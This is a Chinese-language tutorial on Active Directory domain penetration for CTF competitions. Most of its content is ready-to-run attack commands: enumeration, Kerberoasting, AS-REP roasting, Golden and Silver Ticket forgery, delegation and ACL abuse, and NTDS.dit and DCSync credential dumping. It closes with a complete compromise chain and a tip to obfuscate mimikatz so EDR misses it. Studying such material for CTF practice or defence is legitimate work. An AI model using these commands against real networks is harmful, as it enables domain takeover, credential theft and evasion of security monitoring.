# 域渗透基础

## 1. 概述

Active Directory (AD) 域环境是Windows企业网络的核心身份认证和授权基础设施。在CTF竞赛中（尤其是Attack-Defense模式），域渗透是最高难度也是最关键的攻击环节——一旦攻破域控 (Domain Controller, DC)，整个域的所有主机和账户全部沦陷。本节覆盖LDAP信息收集、BloodHound攻击路径分析、Kerberos攻击、票据伪造、ACL滥用等域渗透核心技术。

## 2. 核心原理

### 2.1 Active Directory基础概念

```
Active Directory核心组件：

Forest (林) ─── 安全边界
  │
  ├── Domain (域) ─── 管理边界
  │     ├── Domain Controller (DC) ─ 域控制器（核心目标）
  │     │      ├── NTDS.dit (域数据库，含所有用户哈希)
  │     │      └── Kerberos KDC (密钥分发中心)
  │     ├── Organizational Units (OU) ─ 组织单元
  │     ├── Users / Groups / Computers
  │     └── Group Policy Objects (GPO)
  │
  └── Trust Relationships ─ 信任关系（域间/林间）

关键协议：
- LDAP (389/636): 目录访问
- Kerberos (88): 身份认证
- SMB (445): 文件共享/远程管理
- DNS (53): 域名称解析
- Global Catalog (3268/3269): 跨域查询
- RPC (135 + dynamic): 远程过程调用
- NTP (123): 时间同步（Kerberos依赖）
```

### 2.2 Kerberos认证流程

```
Kerberos认证四步法：

1. AS-REQ (客户端 → KDC)
   [TGT请求] 用户请求票据授予票证
   └── 使用用户密码的NTLM哈希加密时间戳

2. AS-REP (KDC → 客户端)
   [TGT响应] KDC返回TGT
   └── TGT由krbtgt账户的NTLM哈希加密
   └── TGT包含会话密钥

3. TGS-REQ (客户端 → KDC)
   [ST请求] 用户使用TGT请求服务票据
   └── 指定SPN (Service Principal Name)

4. TGS-REP (KDC → 客户端)
   [ST响应] KDC返回服务票据
   └── 由目标服务的账户NTLM哈希加密

关键攻击点：
- AS-REP Roasting: 攻击不需要预认证的账户（无密码即可请求TGT）
- Kerberoasting: 破解服务票据获取服务账户密码
- Golden Ticket: 获得krbtgt哈希后伪造TGT
- Silver Ticket: 获得服务账户哈希后伪造ST
- Overpass-the-Hash: 使用NTLM Hash请求TGT
- Pass-the-Ticket: 使用获取的票据访问服务
```

## 3. 域环境枚举与信息收集

### 3.1 LDAP信息收集

```bash
# === 基础LDAP查询 ===
# Linux
ldapsearch -x -H ldap://10.10.10.10 -D "DOMAIN\user" -w password -b "DC=domain,DC=com"
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=com" "(objectClass=group)"

# 匿名LDAP查询
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=com"

# 有用的LDAP查询
# 所有用户
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\user' -w pass -b "DC=domain,DC=com" \
    "(&(objectClass=user)(objectCategory=person))" sAMAccountName userPrincipalName

# 所有计算机（包括OS信息）
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\user' -w pass -b "DC=domain,DC=com" \
    "(&(objectClass=computer))" name operatingSystem dnshostname

# Service Principal Names (SPN) - Kerberoasting目标
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\user' -w pass -b "DC=domain,DC=com" \
    "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))" servicePrincipalName sAMAccountName

# AS-REP Roasting候选（不需要预认证的用户）
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\user' -w pass -b "DC=domain,DC=com" \
    "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# 描述字段中的密码（管理员失误）
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\user' -w pass -b "DC=domain,DC=com" \
    "(description=*password*)" name description

# === CrackMapExec LDAP ===
crackmapexec ldap dc.domain.com -u user -p pass --users
crackmapexec ldap dc.domain.com -u user -p pass --groups
crackmapexec ldap dc.domain.com -u user -p pass --computers
crackmapexec ldap dc.domain.com -u user -p pass --trusted-for-delegation
crackmapexec ldap dc.domain.com -u user -p pass --password-not-required
crackmapexec ldap dc.domain.com -u user -p pass --admin-count
crackmapexec ldap dc.domain.com -u user -p pass -M MAQ  # MachineAccountQuota
crackmapexec ldap dc.domain.com -u user -p pass -M laps  # LAPS密码
```

### 3.3 BloodHound — 域攻击路径分析

BloodHound是域渗透最核心的分析工具，能够图形化展示域中的用户、组、计算机关系，并自动计算到达Domain Admins的最短攻击路径。

```bash
# === BloodHound数据收集 (SharpHound) ===
# Windows
SharpHound.exe -c All
SharpHound.exe -c All --zipfilename domain_data.zip
SharpHound.exe --CollectionMethod Session,LoggedOn,Trusts,ACL,DCOM

# 指定域控
SharpHound.exe -c All -d domain.com --DomainController 10.10.10.10

# 规避检测（减少收集范围）
SharpHound.exe -c Session,Group,LocalAdmin --stealth

# === Linux版收集器 (bloodhound.py) ===
bloodhound-python -d domain.com -u user -p pass -ns 10.10.10.10 -c All
bloodhound-python -d domain.com -u user -p pass -gc 10.10.10.10 -c DcOnly
bloodhound-python -d domain.com -u user -p 'pass' --hashes :NTLM_HASH -c All

# === 离线分析 ===
# 安装BloodHound
sudo apt install bloodhound
# 或下载最新版
wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip

# 启动Neo4j数据库（BloodHound依赖）
sudo neo4j console
# 访问 http://localhost:7474 设置初始密码（默认neo4j/neo4j）

# 启动BloodHound
bloodhound --no-sandbox

# 导入SharpHound收集的ZIP文件
# 在BloodHound界面: Upload Data → 选择zip文件

# === BloodHound常用Cypher查询 ===
# 找到所有Domain Admins
MATCH (n:Group) WHERE n.name =~ '(?i)DOMAIN ADMINS@.*' MATCH (n)<-[r:MemberOf*1..]-(m) RETURN m.name, m.displayname

# 最短路径到达Domain Admins
MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.name =~ '(?i)YOUR_USER.*' AND m.name =~ '(?i)DOMAIN ADMINS@.*' RETURN p

# 拥有AdminCount=1的用户（敏感/特权账户）
MATCH (u:User) WHERE u.admincount = "1" RETURN u.name

# Kerberoastable 用户
MATCH (u:User) WHERE u.hasspn = true RETURN u.name, u.serviceprincipalnames

# 非约束委派的主机（极高价值目标）
MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c.name

# 约束委派
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate

# 基于资源的约束委派 (RBCD)
MATCH (c:Computer) WHERE c.allowedtoact IS NOT NULL RETURN c.name, c.allowedtoact

# AS-REP Roasting候选（不需要预认证）
MATCH (u:User) WHERE u.dontreqpreauth = true RETURN u.name

# 获得本地管理员权限的机器
MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p
```

## 4. Kerberos攻击

### 4.1 Kerberoasting — 破解服务账户密码

```bash
# === 原理 ===
# 任何域用户都可以为SPN账户请求TGS票据
# TGS票据由服务账户的密码哈希加密
# 可离线暴力破解服务账户密码

# === Impacket Kerberoasting ===
GetUserSPNs.py -request -dc-ip 10.10.10.10 DOMAIN/user:password
GetUserSPNs.py -request -dc-ip 10.10.10.10 DOMAIN/user:password -outputfile kerberoast_hashes.txt

# 使用哈希认证
GetUserSPNs.py -request -dc-ip 10.10.10.10 -hashes :<NTLM> DOMAIN/user

# === Rubeus (Windows) Kerberoasting ===
Rubeus.exe kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /spn:HTTP/web01.domain.com /outfile:hash.txt

# === 破解Kerberoast哈希 ===
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat模式选择：
# -m 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
# -m 19600 = Kerberos 5 TGS-REP etype 17/18 (AES128/AES256)
# -m 19700 = Kerberos 5 TGS-REP etype 17/18 (AES128/AES256)
```

### 4.2 AS-REP Roasting — 不需要预认证的用户

```bash
# === 原理 ===
# 如果用户启用了"不需要Kerberos预认证"
# (DONT_REQ_PREAUTH标志，UserAccountControl=4194304)
# AS-REP响应包含用户密码加密的数据，可离线破解

# === Impacket AS-REP Roasting ===
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.10
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep_hashes.txt

# === Rubeus AS-REP Roasting ===
Rubeus.exe asreproast
Rubeus.exe asreproast /user:target_user /outfile:asrep_hash.txt

# === 破解AS-REP哈希 ===
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 4.3 Golden Ticket (黄金票据)

```bash
# === 原理 ===
# 获取krbtgt账户的NTLM哈希后，可以伪造任意TGT
# 从而以任意用户身份访问域中任何资源
# 这是域渗透的终极目标之一

# === 获取krbtgt哈希 ===
# 方法1: DCSync (需要域管理员或等效权限)
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:DOMAIN\krbtgt" exit

# 方法2: 在域控上直接dump
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt" exit

# 方法3: secretsdump.py
secretsdump.py DOMAIN/Administrator:password@DC_IP
# 提取 krbtgt:502:aes256-cts-hmac-sha1-96:<AES_KEY>

# 方法4: 使用DCSync via DRSUAPI
secretsdump.py DOMAIN/Administrator@DC_IP -just-dc-user krbtgt

# === Mimikatz Golden Ticket注入 ===
# 需要: Domain SID, Domain Name, krbtgt NTLM Hash
mimikatz.exe "kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX /krbtgt:<KRBTGT_NTLM_HASH> /user:Administrator /id:500 /ptt" exit

# 导出为文件
mimikatz.exe "kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:<HASH> /user:Administrator /id:500 /ticket:golden.kirbi" exit

# 票据传递
mimikatz.exe "kerberos::ptt golden.kirbi" exit

# 验证
dir \\DC01\C$
# 应该可以访问

# === Impacket Golden Ticket ===
ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN.LOCAL Administrator
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL
```

### 4.4 Silver Ticket (白银票据)

```bash
# === 原理 ===
# 获取特定服务账户的NTLM哈希后，可以伪造针对该服务的ST
# 比Golden Ticket更隐蔽（不经过KDC），但仅针对特定服务

# === 伪造CIFS服务票据 ===
# 需要: Domain SID, 目标主机计算机账户的NTLM hash

# 获取计算机账户哈希
secretsdump.py DOMAIN/Administrator:password@TARGET_HOST
# 提取 TARGET_HOST$:<NTLM_HASH>

# 生成Silver Ticket (Mimikatz)
mimikatz.exe "kerberos::golden /domain:DOMAIN.LOCAL /sid:<DOMAIN_SID> /target:TARGET_HOST.DOMAIN.LOCAL /service:CIFS /rc4:<COMPUTER_NTLM_HASH> /user:Administrator /ptt" exit

# HOST服务票据 (计划任务/WMI)
mimikatz.exe "kerberos::golden /domain:DOMAIN.LOCAL /sid:<DOMAIN_SID> /target:TARGET_HOST.DOMAIN.LOCAL /service:HOST /rc4:<HASH> /user:Administrator /ptt" exit

# WinRM服务票据
mimikatz.exe "kerberos::golden /domain:DOMAIN.LOCAL /sid:<DOMAIN_SID> /target:TARGET_HOST.DOMAIN.LOCAL /service:HTTP /rc4:<HASH> /user:Administrator /ptt" exit

# RDP服务票据 (TERMSRV)
mimikatz.exe "kerberos::golden /domain:DOMAIN.LOCAL /sid:<DOMAIN_SID> /target:TARGET_HOST.DOMAIN.LOCAL /service:TERMSRV /rc4:<HASH> /user:Administrator /ptt" exit

# 白银票据验证
dir \\TARGET_HOST.DOMAIN.LOCAL\C$
psexec.exe \\TARGET_HOST.DOMAIN.LOCAL cmd.exe
```

### 4.6 委派攻击

```bash
# === 非约束委派 (Unconstrained Delegation) ===
# 当用户访问启用了非约束委派的主机时，其TGT会缓存在该主机
# 攻击者可以从该主机提取TGT，然后在域内任意使用

# 发现非约束委派主机
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
# BloodHound: MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c.name

# 利用 (在非约束委派主机上)
# 1. 提升为SYSTEM
# 2. 导出TGT票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
# 3. 找到域管理员用户的TGT
dir *.kirbi | findstr Administrator
# 4. 传递票据
mimikatz.exe "kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi" exit
# 5. DCSync
mimikatz.exe "lsadump::dcsync /user:krbtgt" exit

# 打印机诱饵强制域控认证
# 使用SpoolSample强制域控的机器账户连接到非约束委派主机
# SpoolSample.exe DC_HOST UNCONSTRAINED_HOST
# 然后在非约束委派主机上捕获域控的机器账户TGT

# === 约束委派 (Constrained Delegation) ===
# 发现
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
# S4U2Self + S4U2Proxy 攻击

# 使用Rubeus进行S4U攻击
# 1. 如果已知服务账户密码/哈希
Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/DC01.DOMAIN.LOCAL /ptt

# 2. 使用AES密钥
Rubeus.exe s4u /user:SVC_ACCOUNT /aes256:<AES_KEY> /impersonateuser:Administrator /msdsspn:cifs/DC01.DOMAIN.LOCAL /ptt

# === 基于资源的约束委派 (RBCD) ===
# 如果攻击者可以修改目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性
# 并且拥有另一个计算机账户的控制权

# 利用PowerMad创建计算机账户（需要MachineAccountQuota > 0）
New-MachineAccount -MachineAccount FAKE_COMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 获取FAKE_COMPUTER$的SID
Get-DomainComputer FAKE_COMPUTER | Select -ExpandProperty objectsid

# 配置RBCD (需要目标机器的写权限，如GenericWrite/GenericAll)
Set-DomainRBCD -Identity TARGET_COMPUTER -DelegateFrom FAKE_COMPUTER$

# 执行S4U攻击
Rubeus.exe s4u /user:FAKE_COMPUTER$ /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMPUTER.DOMAIN.LOCAL /ptt
```

## 5. ACL滥用攻击

Active Directory 的 ACL (Access Control List) 配置错误是域渗透的高价值目标。

```bash
# === 常见滥用ACL权限 ===

# GenericAll / FullControl (完全控制)
# → 修改密码、添加SPN、配置RBCD、添加到组

# WriteProperty (写入属性)
# → 修改特定属性，如userAccountControl, servicePrincipalName, msDS-AllowedToActOnBehalfOfOtherIdentity

# WriteDacl (写入ACL)
# → 授予自己额外权限

# Self (Self-Membership)
# → 将自己添加到组

# ForceChangePassword
# → 重置用户密码

# AddMember
# → 将用户添加到组

# === BloodHound ACL分析 ===
# 查询从当前用户到高价值目标的ACL路径
# 在BloodHound中: Analysis → Shortest Path to Domain Admins

# === PowerView ACL利用 ===
# 添加用户到组 (需要AddMember权限)
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker_user

# 修改用户密码 (需要ForceChangePassword权限)
$newpass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $newpass

# 写入SPN (需要GenericAll/GenericWrite on User)
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='evil/whatever'}
# 然后对该用户进行Kerberoasting

# === Owned → WriteOwner → TargetUser ===
# WriteOwner: 修改目标所有者
# 成为所有者后，可以授予自己GenericAll

# 同dacledit.py
dacledit.py -action 'write' -rights 'FullControl' -principal attacker -target target_user DOMAIN/admin:password
```

## 6. 域控攻击

```bash
# === NTDS.dit 提取 ===

# 方法1: Ntdsutil (Windows native)
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntds" quit quit
# 提取 NTDS.dit 和 SYSTEM/SAM

# 方法2: vssadmin 卷影复制
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
vssadmin delete shadows /for=C: /all

# 方法3: diskshadow (无vssadmin时)
# 创建 diskshadow.txt:
# set context persistent nowriters
# add volume c: alias temp
# create
# expose %temp% z:
# exec cmd.exe /c copy z:\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
# delete shadows volume temp
# reset
diskshadow /s diskshadow.txt

# 提取SYSTEM hive
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# 解析NTDS.dit
secretsdump.py -ntds /path/to/NTDS.dit -system /path/to/SYSTEM LOCAL
# 输出所有域用户的NTLM哈希

# === DCSync (离线版NTDS提取) ===
# 更隐蔽，不需要触碰域控磁盘
secretsdump.py DOMAIN/Administrator@DC_IP -outputfile dcsync_dump
```

## 7. 实战示例

### 7.1 完整域渗透攻击链

**场景：** 通过Phishing获得了一个普通域用户 (DOMAIN\jdoe) 的明文密码，域为 `CTF.LOCAL`，域控为 `10.10.10.10`。

```bash
# === 阶段1: 域枚举 ===
crackmapexec smb 10.10.10.10 -u jdoe -p 'Password123' --users > domain_users.txt
crackmapexec smb 10.10.10.10 -u jdoe -p 'Password123' --groups
crackmapexec smb 10.10.10.10 -u jdoe -p 'Password123' -M MAQ

# === 阶段2: BloodHound分析 ===
bloodhound-python -d CTF.LOCAL -u jdoe -p 'Password123' -ns 10.10.10.10 -c All
# 导入BloodHound分析
# 发现: jdoe 在 "ACL Admins" 组
# "ACL Admins" 对 SQL_SVC 有 WriteDacl
# SQL_SVC 有 SPN → Kerberoastable

# === 阶段3: WriteDacl → GenericAll → Kerberoasting ===
# 通过WriteDacl授予自己完全控制SQL_SVC
dacledit.py -action 'write' -rights 'FullControl' -principal jdoe \
    -target-dn "CN=SQL_SVC,CN=Users,DC=CTF,DC=LOCAL" CTF.LOCAL/jdoe:'Password123'

# 现在可以修改SQL_SVC的密码
# 或直接进行目标Kerberoasting（如果没有FullControl，只能用已存在的SPN）

# === 阶段4: Kerberoasting获取服务账户 ===
GetUserSPNs.py -request -dc-ip 10.10.10.10 CTF.LOCAL/jdoe:'Password123'
# 获得: SQL_SVC → TGS Hash

hashcat -m 13100 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt --force
# 破解得到: SQL_SVC : SQLp@ss2024!

# === 阶段5: 从SQL_SVC到域管理员 ===
# BloodHound分析SQL_SVC的权限
# 发现: SQL_SVC 是 "SQL Admins" 组成员
# "SQL Admins" 对 FILE_SERVER.CTF.LOCAL 有 AdminTo

# 横向移动
wmiexec.py CTF.LOCAL/SQL_SVC:'SQLp@ss2024!'@FILE_SERVER.CTF.LOCAL
# 在FILE_SERVER上以SYSTEM身份执行

# 发现FILE_SERVER上有域管理员会话（BloodHound中标记）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# 找到: CTF\Administrator : NTLM: fc525c9683e8fe0672baa197cd1b525a

# === 阶段6: DCSync获取全部哈希 ===
secretsdump.py CTF.LOCAL/Administrator@10.10.10.10 \
    -hashes :fc525c9683e8fe0672baa197cd1b525a
# 获得所有域用户的NTLM哈希，包括krbtgt
# krbtgt: aad3b435b51404eeaad3b435b51404ee:c7d0f09e1e78f8c8d8cce0e4ae56e3b4

# === 阶段7: Golden Ticket (持久化) ===
ticketer.py -nthash c7d0f09e1e78f8c8d8cce0e4ae56e3b4 \
    -domain-sid S-1-5-21-123456789-1234567890-123456789 \
    -domain CTF.LOCAL Administrator

export KRB5CCNAME=Administrator.ccache

# 验证Golden Ticket
wmiexec.py -k -no-pass CTF.LOCAL/Administrator@DC01.CTF.LOCAL "whoami"
# ctf\administrator → 成功！

# === 阶段8: 收集所有Flag ===
crackmapexec smb 10.10.10.0/24 -u Administrator \
    -H fc525c9683e8fe0672baa197cd1b525a --local-auth \
    -x "type C:\Users\Administrator\Desktop\flag.txt"
# 批量收集所有Flag
```

## 8. 常见误区与注意事项

- **误区1：获得域用户就等于进入域。** 需要理解从普通域用户到Domain Admin的完整攻击路径（BloodHound是关键）。
- **误区2：DCSync只能在域控上执行。** DCSync是网络攻击，只要具有Replication权限即可从任何域内主机执行。
- **误区3：Golden Ticket不会被检测到。** Golden Ticket创建的事件（如4768/4769）以及异常的生存时间（默认TGT 10小时，Golden通常设10年）会触发检测。
- **误区4：忽略ACL滥用路径。** 很多时候不需要直接攻击域控，通过ACL权限提升链可以逐步达到目标。
- **注意：Kerberos依赖时钟同步（默认5分钟偏差）。票据伪造时确保攻击机和目标时间一致。**
- **注意：Windows Defender/EDR可能检测mimikatz。使用自定义工具或混淆版。**

## 9. 相关知识点

- **LAPS (Local Administrator Password Solution):** 本地管理员密码管理
- **AD CS (Active Directory Certificate Services):** 证书服务攻击 (ESC1-ESC8)
- **AD FS (Active Directory Federation Services):** 联邦服务攻击
- **Group Policy Preferences (GPP) 密码:** cpassword解密
- **SID History注入:** Skeleton Key攻击
- **Kerberos Bronze Bit (CVE-2020-17049):** 绕过约束委派限制
- **sAMAccountName Spoofing (CVE-2021-42278/42287):** 域控制器模拟攻击
- **PAC (Privilege Attribute Certificate):** 票据中的PAC伪造
